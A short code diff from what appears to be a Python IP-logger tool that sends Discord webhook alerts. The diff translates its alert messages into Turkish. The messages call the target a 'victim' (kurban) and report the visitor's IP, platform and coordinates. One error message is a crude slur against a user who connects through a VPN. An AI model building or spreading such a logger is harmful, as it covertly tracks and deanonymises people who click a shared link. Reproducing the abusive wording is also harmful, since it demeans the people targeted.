@@ -76,9 +76,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Woldan Logger - Error",
+            "title": ".gg/istisna - Hata Yakalandı Aşağıda Detayları Görebilirsiniz.",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"Bitane Orospu Çocuğu VPN'le girmeye çalışırken kodu buga soktu!\n\n**Hata:**\n```\n{error}\n```",
         }
     ],
 })
@@ -95,7 +95,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": ".gg/istisna - Link Bir Kullanıcı Tarafından İletildi.",
+            "title": ".gg/istisna - Link Bir Kullanıcı Tarafından Bir Sohbete İletildi.",
             "color": config["color"],
             "description": f"Link Bir Sohbete İletildi. Kurban Bekleniyor... \n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
